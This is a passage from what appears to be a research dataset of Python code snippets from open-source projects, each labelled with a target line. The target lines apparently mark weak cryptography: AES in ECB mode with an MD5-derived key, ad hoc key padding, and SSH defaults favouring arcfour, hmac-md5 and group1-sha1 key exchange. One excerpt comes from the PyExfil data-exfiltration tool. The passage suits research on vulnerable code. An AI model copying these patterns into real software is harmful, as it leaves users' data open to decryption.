      "        [file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]\n",
      "\n",
      "\n",
      "class AES_256_CFB:\n",
      "    \"\"\"\n",
      "    Encripción mediante AES_256_CFB, para ser usado con el cliente de PHP\n",
      "    \"\"\"\n",
      "    @staticmethod\n",
      "    def encrypt(message, session_key, file_out):\n",
      "        \"\"\"\n",
      "        Encripta el mensaje usando la llave de sesión suministrada usando AES_256_CFB\n",
      "        y guarda en file_out la información de encripción en el siguiente orden:\n",
      "        nonce, tag, texto encriptado\n",
      "\n",
      "        :param message:  Mensaje a encriptar  en binario\n",
      "        :param session_key: Llave de encripción en binario\n",
      "        :param file_out: Archivo de salida abierto en modo binario\n",
      "        :return:  None\n",
      "        \"\"\"\n",
      "        # passphrase MUST be 16, 24 or 32 bytes long, how can I do that ?\n",
      "        IV = Random.new().read(BLOCK_SIZE)\n",
      "        aes = AES.new(session_key, AES.MODE_CFB, IV,  segment_size=128)\n",
      "        enc_message = aes.encrypt(message)\n",
      "        [file_out.write(x) for x in (IV, enc_message)]\n",
      "\n",
      "    @staticmethod\n",
      "    def decrypt(file_in, private_key, session_key=None):\n",
      "        '''\n",
      "        Desencripta los datos siministrados en file_in usando el método AES_256_CFB\n",
      "\n",
      "        :param file_in: Dato binario a desencriptar\n",
      "        :param private_key:  llave privada del servidor para la institución\n",
      "        :param session_key: None por defecto, en caso de necesitarse puede pasarse en binario\n",
      "        :return: Texto desencriptado en binario\n",
      "        '''\n",
      "        if session_key is None:\n",
      "            private_key = RSA.import_key(private_key)\n",
      "            enc_session_key, iv, ciphertext = \\\n",
      "                [file_in.read(x)\n",
      "                 for x in (private_key.size_in_bytes(), BLOCK_SIZE, -1)]\n",
      "\n",
      "            cipher_rsa = PKCS1_OAEP.new(private_key)\n",
      "            session_key = cipher_rsa.decrypt(enc_session_key)\n",
      "\n",
      "        aes = AES.new(session_key, AES.MODE_CFB, iv, segment_size=128)\n",
      "        return aes.decrypt(ciphertext)\n",
      "\n",
      "\n",
      "Available_ciphers = {\n",
      "    \"aes_eax\": AES_EAX,\n",
      "    \"aes-256-cfb\": AES_256_CFB\n",
      "}\n"
    ],
    "target": 50,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva/src/corebase/ciphers/__init__.py",
    "code": [
      "        :param session_key: None por defecto, en caso de necesitarse puede pasarse en binario\n",
      "        :return: Texto desencriptado en binario\n",
      "        '''\n",
      "        if session_key is None:\n",
      "            private_key = RSA.import_key(private_key)\n",
      "\n",
      "            enc_session_key, nonce, tag, ciphertext = \\\n",
      "                [file_in.read(x)\n",
      "                 for x in (private_key.size_in_bytes(), BLOCK_SIZE, 16, -1)]\n",
      "\n",
      "            cipher_rsa = PKCS1_OAEP.new(private_key)\n",
      "        session_key = cipher_rsa.decrypt(enc_session_key)\n",
      "        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "        return cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "\n",
      "    @staticmethod\n",
      "    def encrypt(message, session_key, file_out):\n",
      "        \"\"\"\n",
      "        Encripta el mensaje usando la llave de sesión suministrada usando AES_EAX\n",
      "        y guarda en file_out la información de encripción en el siguiente orden:\n",
      "        nonce, tag, texto encriptado\n",
      "\n",
      "        :param message:  Mensaje a encriptar  en binario\n",
      "        :param session_key: Llave de encripción en binario\n",
      "        :param file_out: Archivo de salida abierto en modo binario\n",
      "        :return:  None\n",
      "        \"\"\"\n",
      "        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n",
      "        ciphertext, tag = cipher_aes.encrypt_and_digest(message)\n",
      "        [file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]\n",
      "\n",
      "\n",
      "class AES_256_CFB:\n",
      "    \"\"\"\n",
      "    Encripción mediante AES_256_CFB, para ser usado con el cliente de PHP\n",
      "    \"\"\"\n",
      "    @staticmethod\n",
      "    def encrypt(message, session_key, file_out):\n",
      "        \"\"\"\n",
      "        Encripta el mensaje usando la llave de sesión suministrada usando AES_256_CFB\n",
      "        y guarda en file_out la información de encripción en el siguiente orden:\n",
      "        nonce, tag, texto encriptado\n",
      "\n",
      "        :param message:  Mensaje a encriptar  en binario\n",
      "        :param session_key: Llave de encripción en binario\n",
      "        :param file_out: Archivo de salida abierto en modo binario\n",
      "        :return:  None\n",
      "        \"\"\"\n",
      "        # passphrase MUST be 16, 24 or 32 bytes long, how can I do that ?\n",
      "        IV = Random.new().read(BLOCK_SIZE)\n",
      "        aes = AES.new(session_key, AES.MODE_CFB, IV,  segment_size=128)\n",
      "        enc_message = aes.encrypt(message)\n",
      "        [file_out.write(x) for x in (IV, enc_message)]\n",
      "\n",
      "    @staticmethod\n",
      "    def decrypt(file_in, private_key, session_key=None):\n",
      "        '''\n",
      "        Desencripta los datos siministrados en file_in usando el método AES_256_CFB\n",
      "\n",
      "        :param file_in: Dato binario a desencriptar\n",
      "        :param private_key:  llave privada del servidor para la institución\n",
      "        :param session_key: None por defecto, en caso de necesitarse puede pasarse en binario\n",
      "        :return: Texto desencriptado en binario\n",
      "        '''\n",
      "        if session_key is None:\n",
      "            private_key = RSA.import_key(private_key)\n",
      "            enc_session_key, iv, ciphertext = \\\n",
      "                [file_in.read(x)\n",
      "                 for x in (private_key.size_in_bytes(), BLOCK_SIZE, -1)]\n",
      "\n",
      "            cipher_rsa = PKCS1_OAEP.new(private_key)\n",
      "            session_key = cipher_rsa.decrypt(enc_session_key)\n",
      "\n",
      "        aes = AES.new(session_key, AES.MODE_CFB, iv, segment_size=128)\n",
      "        return aes.decrypt(ciphertext)\n",
      "\n",
      "\n",
      "Available_ciphers = {\n",
      "    \"aes_eax\": AES_EAX,\n",
      "    \"aes-256-cfb\": AES_256_CFB\n",
      "}\n"
    ],
    "target": 73,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva/src/institution/stamp/serializer.py",
    "code": [
      "\n",
      "# This program is distributed in the hope that it will be useful,\n",
      "# but WITHOUT ANY WARRANTY; without even the implied warranty of\n",
      "# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n",
      "# GNU General Public License for more details.\n",
      "\n",
      "# You should have received a copy of the GNU General Public License\n",
      "# along with this program.  If not, see <https://www.gnu.org/licenses/>.\n",
      "\n",
      "'''\n",
      "@date: 12/9/2017\n",
      "@author: Universidad de Costa Rica\n",
      "@maintainer: Luis Zarate Montero\n",
      "@contact: luis.zarate@solvosoft.com\n",
      "@license: GPLv3\n",
      "'''\n",
      "\n",
      "\n",
      "from institution.models import StampRequest, StampDataRequest\n",
      "from institution.serializer import InstitutionCheckBaseBaseSerializer\n",
      "from institution.stamp.forms import StampDataForm, StampDataCheckForm\n",
      "from django.utils import timezone\n",
      "from corebase.time import parse_datetime\n",
      "from rest_framework import serializers\n",
      "from django.conf import settings\n",
      "from pyfva.constants import get_text_representation, ERRORES_AL_SOLICITAR_SELLO\n",
      "from corebase import logger\n",
      "from institution.tasks import task_stamp_call_bccr\n",
      "\n",
      "\n",
      "class Stamp_RequestSerializer(serializers.HyperlinkedModelSerializer):\n",
      "    \"\"\"\n",
      "    Serializador de peticiones de firma\n",
      "    \"\"\"\n",
      "\n",
      "    log_sector = 'stamp'\n",
      "\n",
      "    #: Almacena la petición encriptada\n",
      "    data = serializers.CharField(\n",
      "        help_text=\"\"\"Datos de solicitud de autenticación encriptados usando \n",
      "        AES.MODE_EAX con la llave de sesión encriptada con PKCS1_OAEP\n",
      "         \"\"\")\n",
      "    readonly_fields = ['data']\n",
      "    #: Almacena las métricas de tiempo\n",
      "    time_messages = {}\n",
      "\n",
      "    def save_datarequest(self):\n",
      "        \"\"\"\n",
      "        Almacena los datos de la tarea\n",
      "\n",
      "        :return: Nada\n",
      "        \"\"\"\n",
      "        self.time_messages['start_save_database'] = timezone.now()\n",
      "        self.save_subject()\n",
      "        self.adr.document = self.requestdata['document']\n",
      "        self.adr.document_hash = self.requestdata['document_hash']\n",
      "        self.adr.algorithm_hash = self.requestdata['algorithm_hash'].title()\n",
      "        self.adr.id_functionality = self.requestdata['id_functionality']\n",
      "\n",
      "        self.adr.request_datetime = parse_datetime(self.requestdata['request_datetime'])\n",
      "        self.adr.eta = parse_datetime(self.requestdata['eta']) if 'eta' in self.requestdata else None\n",
      "        run_date = timezone.now()\n",
      "        if self.adr.eta:\n",
      "            run_date = self.adr.eta\n",
      "        self.adr.expiration_datetime = run_date + timezone.timedelta(minutes=self.adr.duration)\n",
      "        self.adr.status_text = get_text_representation(ERRORES_AL_SOLICITAR_SELLO, settings.DEFAULT_SUCCESS_BCCR)\n",
      "        self.adr.status = settings.DEFAULT_SUCCESS_BCCR\n",
      "\n",
      "        self.adr.document_format = self.requestdata['format']\n",
      "        self.adr.lugar = self.requestdata['place'] if 'place' in self.requestdata else None\n",
      "        self.adr.razon = self.requestdata['reason'] if 'reason' in self.requestdata else None\n",
      "\n",
      "        self.time_messages['transaction_status'] = self.adr.status\n",
      "        self.time_messages['transaction_status_text'] = self.adr.status_text\n",
      "        self.time_messages['transaction_success'] = settings.DEFAULT_SUCCESS_BCCR == self.adr.status\n",
      "        self.adr.save()\n",
      "\n",
      "    def call_bccr(self):\n",
      "        task_stamp_call_bccr.apply_async(args=(self.adr.pk, self.adr.institution.pk), eta=self.adr.eta)\n",
      "\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/esn89/keepassc/keepassc/helper.py",
    "code": [
      "            for line in handler:\n",
      "                key, val = line.split('=')\n",
      "                if val == 'True\\n':\n",
      "                    val = True\n",
      "                elif val == 'False\\n':\n",
      "                    val = False\n",
      "                else:\n",
      "                    val = int(val)\n",
      "                if key in config:\n",
      "                    config[key] = val\n",
      "            handler.close()\n",
      "    else:  # write standard config\n",
      "        write_config(control, config)\n",
      "    return config\n",
      "\n",
      "\n",
      "def write_config(control, config):\n",
      "    '''Function to write the config file'''\n",
      "\n",
      "    config_dir = control.config_home[:-7]\n",
      "    if not isdir(config_dir):\n",
      "        if isfile(config_dir):\n",
      "            remove(config_dir)\n",
      "        makedirs(config_dir)\n",
      "    try:\n",
      "        handler = open(control.config_home, 'w')\n",
      "    except Exception as err:\n",
      "        print(err.__str__())\n",
      "        return False\n",
      "    else:\n",
      "        for key, val in config.items():\n",
      "            handler.write(key + '=' + str(val) + '\\n')\n",
      "        handler.close()\n",
      "    return True\n",
      "\n",
      "def transform_key(masterkey, seed1, seed2, rounds):\n",
      "    \"\"\"This method creates the key to decrypt the database\"\"\"\n",
      "\n",
      "    if masterkey is None or seed1 is None or seed2 is None or rounds is None:\n",
      "        raise TypeError('None type not allowed')\n",
      "    aes = AES.new(seed1, AES.MODE_ECB)\n",
      "\n",
      "    # Encrypt the created hash\n",
      "    for i in range(rounds):\n",
      "        masterkey = aes.encrypt(masterkey)\n",
      "\n",
      "    # Finally, hash it again...\n",
      "    sha_obj = SHA256.new()\n",
      "    sha_obj.update(masterkey)\n",
      "    masterkey = sha_obj.digest()\n",
      "    # ...and hash the result together with the randomseed\n",
      "    sha_obj = SHA256.new()\n",
      "    sha_obj.update(seed2 + masterkey)\n",
      "    return sha_obj.digest()\n",
      "\n",
      "def get_passwordkey(key):\n",
      "    \"\"\"This method hashes key\"\"\"\n",
      "\n",
      "    if key is None:\n",
      "        raise TypeError('None type not allowed')\n",
      "    sha = SHA256.new()\n",
      "    sha.update(key.encode('utf-8'))\n",
      "    return sha.digest()\n",
      "\n",
      "def get_filekey(keyfile):\n",
      "    \"\"\"This method creates a key from a keyfile.\"\"\"\n",
      "\n",
      "    try:\n",
      "        handler = open(keyfile, 'rb')\n",
      "        buf = handler.read()\n",
      "    except:\n",
      "        raise OSError('Could not open or read file.')\n",
      "    else:\n",
      "        handler.close()\n",
      "    sha = SHA256.new()\n",
      "    if len(buf) == 33:\n",
      "        sha.update(buf)\n",
      "        return sha.digest()\n",
      "    elif len(buf) == 65:\n",
      "        sha.update(struct.unpack('<65s', buf)[0].decode())\n",
      "        return sha.digest()\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/bitprophet/ssh/ssh/transport.py",
    "code": [
      "                del self._map[chanid]\n",
      "            except KeyError:\n",
      "                pass\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def values(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return self._map.values()\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def __len__(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return len(self._map)\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "\n",
      "class Transport (threading.Thread):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    L{Channel}s, across the session.  Multiple channels can be multiplexed\n",
      "    across a single session (and often are, in the case of port forwardings).\n",
      "    \"\"\"\n",
      "\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'ssh_%s' % (ssh.__version__)\n",
      "\n",
      "    _preferred_ciphers = ( 'aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc', 'aes256-cbc', '3des-cbc',\n",
      "        'arcfour128', 'arcfour256' )\n",
      "    _preferred_macs = ( 'hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96' )\n",
      "    _preferred_keys = ( 'ssh-rsa', 'ssh-dss' )\n",
      "    _preferred_kex = ( 'diffie-hellman-group1-sha1', 'diffie-hellman-group-exchange-sha1' )\n",
      "    _preferred_compression = ( 'none', )\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32 },\n",
      "        'blowfish-cbc': { 'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16 },\n",
      "        'aes128-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32 },\n",
      "        '3des-cbc': { 'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24 },\n",
      "        'arcfour128': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16 },\n",
      "        'arcfour256': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32 },\n",
      "        }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': { 'class': SHA, 'size': 20 },\n",
      "        'hmac-sha1-96': { 'class': SHA, 'size': 12 },\n",
      "        'hmac-md5': { 'class': MD5, 'size': 16 },\n",
      "        'hmac-md5-96': { 'class': MD5, 'size': 12 },\n",
      "        }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'zlib': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'none': ( None, None ),\n",
      "    }\n",
      "\n",
      "\n",
      "    _modulus_pack = None\n",
      "\n",
      "    def __init__(self, sock):\n",
      "        \"\"\"\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/bitprophet/ssh/ssh/transport.py",
    "code": [
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def values(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return self._map.values()\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def __len__(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return len(self._map)\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "\n",
      "class Transport (threading.Thread):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    L{Channel}s, across the session.  Multiple channels can be multiplexed\n",
      "    across a single session (and often are, in the case of port forwardings).\n",
      "    \"\"\"\n",
      "\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'ssh_%s' % (ssh.__version__)\n",
      "\n",
      "    _preferred_ciphers = ( 'aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc', 'aes256-cbc', '3des-cbc',\n",
      "        'arcfour128', 'arcfour256' )\n",
      "    _preferred_macs = ( 'hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96' )\n",
      "    _preferred_keys = ( 'ssh-rsa', 'ssh-dss' )\n",
      "    _preferred_kex = ( 'diffie-hellman-group1-sha1', 'diffie-hellman-group-exchange-sha1' )\n",
      "    _preferred_compression = ( 'none', )\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32 },\n",
      "        'blowfish-cbc': { 'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16 },\n",
      "        'aes128-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32 },\n",
      "        '3des-cbc': { 'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24 },\n",
      "        'arcfour128': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16 },\n",
      "        'arcfour256': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32 },\n",
      "        }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': { 'class': SHA, 'size': 20 },\n",
      "        'hmac-sha1-96': { 'class': SHA, 'size': 12 },\n",
      "        'hmac-md5': { 'class': MD5, 'size': 16 },\n",
      "        'hmac-md5-96': { 'class': MD5, 'size': 12 },\n",
      "        }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'zlib': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'none': ( None, None ),\n",
      "    }\n",
      "\n",
      "\n",
      "    _modulus_pack = None\n",
      "\n",
      "    def __init__(self, sock):\n",
      "        \"\"\"\n",
      "        Create a new SSH session over an existing socket, or socket-like\n",
      "        object.  This only creates the Transport object; it doesn't begin the\n",
      "        SSH session yet.  Use L{connect} or L{start_client} to begin a client\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/bitprophet/ssh/ssh/transport.py",
    "code": [
      "                pass\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def values(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return self._map.values()\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "    def __len__(self):\n",
      "        self._lock.acquire()\n",
      "        try:\n",
      "            return len(self._map)\n",
      "        finally:\n",
      "            self._lock.release()\n",
      "\n",
      "\n",
      "class Transport (threading.Thread):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    L{Channel}s, across the session.  Multiple channels can be multiplexed\n",
      "    across a single session (and often are, in the case of port forwardings).\n",
      "    \"\"\"\n",
      "\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'ssh_%s' % (ssh.__version__)\n",
      "\n",
      "    _preferred_ciphers = ( 'aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc', 'aes256-cbc', '3des-cbc',\n",
      "        'arcfour128', 'arcfour256' )\n",
      "    _preferred_macs = ( 'hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96' )\n",
      "    _preferred_keys = ( 'ssh-rsa', 'ssh-dss' )\n",
      "    _preferred_kex = ( 'diffie-hellman-group1-sha1', 'diffie-hellman-group-exchange-sha1' )\n",
      "    _preferred_compression = ( 'none', )\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-ctr': { 'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32 },\n",
      "        'blowfish-cbc': { 'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16 },\n",
      "        'aes128-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16 },\n",
      "        'aes256-cbc': { 'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32 },\n",
      "        '3des-cbc': { 'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24 },\n",
      "        'arcfour128': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16 },\n",
      "        'arcfour256': { 'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32 },\n",
      "        }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': { 'class': SHA, 'size': 20 },\n",
      "        'hmac-sha1-96': { 'class': SHA, 'size': 12 },\n",
      "        'hmac-md5': { 'class': MD5, 'size': 16 },\n",
      "        'hmac-md5-96': { 'class': MD5, 'size': 12 },\n",
      "        }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'zlib': ( ZlibCompressor, ZlibDecompressor ),\n",
      "        'none': ( None, None ),\n",
      "    }\n",
      "\n",
      "\n",
      "    _modulus_pack = None\n",
      "\n",
      "    def __init__(self, sock):\n",
      "        \"\"\"\n",
      "        Create a new SSH session over an existing socket, or socket-like\n",
      "        object.  This only creates the Transport object; it doesn't begin the\n",
      "        SSH session yet.  Use L{connect} or L{start_client} to begin a client\n",
      "        session, or L{start_server} to begin a server session.\n",
      "\n"
    ],
    "target": 40,
    "len": 4
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/shaunduncan/breezeminder/breezeminder/util/crypto.py",
    "code": [
      "import base64\n",
      "\n",
      "from hashlib import md5\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "from breezeminder.app import app\n",
      "\n",
      "\n",
      "BLOCK_SIZE = 32\n",
      "PAD_STRING = '>'\n",
      "CIPHER_KEY = md5(app.config['SECRET_KEY']).hexdigest()\n",
      "AES_CIPHER = AES.new(CIPHER_KEY, AES.MODE_ECB)\n",
      "\n",
      "\n",
      "def _pad(string):\n",
      "    pad_string = (BLOCK_SIZE - len(string) % BLOCK_SIZE) * PAD_STRING\n",
      "    return '%s%s' % (string, pad_string)\n",
      "\n",
      "\n",
      "@app.cache.memoize(timeout=3600)\n",
      "def encrypt(string):\n",
      "    return base64.b64encode(AES_CIPHER.encrypt(_pad(string)))\n",
      "\n",
      "\n",
      "@app.cache.memoize(timeout=3600)\n",
      "def decrypt(string):\n",
      "    return AES_CIPHER.decrypt(base64.b64decode(string)).rstrip(PAD_STRING)\n"
    ],
    "target": 11,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/yabuta/CameraSender/CameraToServer/python/server/AESClass.py",
    "code": [
      "#!/usr/bin/env python\n",
      "# -*- coding:utf-8 -*-\n",
      "\n",
      "#Copyright (c) 2014 teitei_tk  \n",
      "#http://qiita.com/teitei_tk/items/0b8bae99a8700452b718\n",
      "#Released under the MIT license\n",
      "#http://opensource.org/licenses/mit-license.php\n",
      "\n",
      "import base64\n",
      "from Crypto import Random\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "\n",
      "class AESCipher(object):\n",
      "    def __init__(self, key, block_size=16):\n",
      "        self.bs = block_size\n",
      "        if len(key) >= block_size:\n",
      "            self.key = key[:block_size]\n",
      "        else:\n",
      "            self.key = self._pad(key)\n",
      "\n",
      "    def encrypt(self, raw):\n",
      "        raw = self._pad(raw)\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return base64.b64encode(iv + cipher.encrypt(raw))\n",
      "\n",
      "    def decrypt(self, enc):\n",
      "        enc = base64.b64decode(enc)\n",
      "        iv = enc[:AES.block_size]\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return self._unpad(cipher.decrypt(enc[AES.block_size:]))\n",
      "\n",
      "    def _pad(self, s):\n",
      "        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)\n",
      "\n",
      "    def _unpad(self, s):\n",
      "        return s[:-ord(s[len(s)-1:])]\n"
    ],
    "target": 24,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/yabuta/CameraSender/CameraToServer/python/server/AESClass.py",
    "code": [
      "#!/usr/bin/env python\n",
      "# -*- coding:utf-8 -*-\n",
      "\n",
      "#Copyright (c) 2014 teitei_tk  \n",
      "#http://qiita.com/teitei_tk/items/0b8bae99a8700452b718\n",
      "#Released under the MIT license\n",
      "#http://opensource.org/licenses/mit-license.php\n",
      "\n",
      "import base64\n",
      "from Crypto import Random\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "\n",
      "class AESCipher(object):\n",
      "    def __init__(self, key, block_size=16):\n",
      "        self.bs = block_size\n",
      "        if len(key) >= block_size:\n",
      "            self.key = key[:block_size]\n",
      "        else:\n",
      "            self.key = self._pad(key)\n",
      "\n",
      "    def encrypt(self, raw):\n",
      "        raw = self._pad(raw)\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return base64.b64encode(iv + cipher.encrypt(raw))\n",
      "\n",
      "    def decrypt(self, enc):\n",
      "        enc = base64.b64decode(enc)\n",
      "        iv = enc[:AES.block_size]\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return self._unpad(cipher.decrypt(enc[AES.block_size:]))\n",
      "\n",
      "    def _pad(self, s):\n",
      "        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)\n",
      "\n",
      "    def _unpad(self, s):\n",
      "        return s[:-ord(s[len(s)-1:])]\n"
    ],
    "target": 30,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ytisf/PyExfil/pyexfil/network/QUIC/quic_client.py",
    "code": [
      "\n",
      "import sys\n",
      "import time\n",
      "import socket\n",
      "import struct\n",
      "import random\n",
      "import hashlib\n",
      "import urllib2\n",
      "\n",
      "from Crypto import Random\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "# from itertools import izip_longest\n",
      "\n",
      "# Setting timeout so that we won't wait forever\n",
      "timeout = 2\n",
      "socket.setdefaulttimeout(timeout)\n",
      "limit = 256*256*256*256 - 1\n",
      "\n",
      "\n",
      "def md5(fname):\n",
      "    hash_md5 = hashlib.md5()\n",
      "    with open(fname, \"rb\") as f:\n",
      "        for chunk in iter(lambda: f.read(4096), b\"\"):\n",
      "            hash_md5.update(chunk)\n",
      "    return hash_md5.hexdigest()\n",
      "\n",
      "def chunkstring(s, n):\n",
      "    return [ s[i:i+n] for i in xrange(0, len(s), n) ]\n",
      "\n",
      "\n",
      "class AESCipher(object):\n",
      "\n",
      "    def __init__(self, key):\n",
      "        self.bs = 32\n",
      "        self.key = hashlib.sha256(key.encode()).digest()\n",
      "\n",
      "    def encrypt(self, raw):\n",
      "        raw = self._pad(raw)\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
      "        return iv + cipher.encrypt(raw)\n",
      "\n",
      "    def decrypt(self, enc):\n",
      "        # enc = base64.b64decode(enc)\n",
      "        iv = enc[:AES.block_size]\n",
      "        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n",
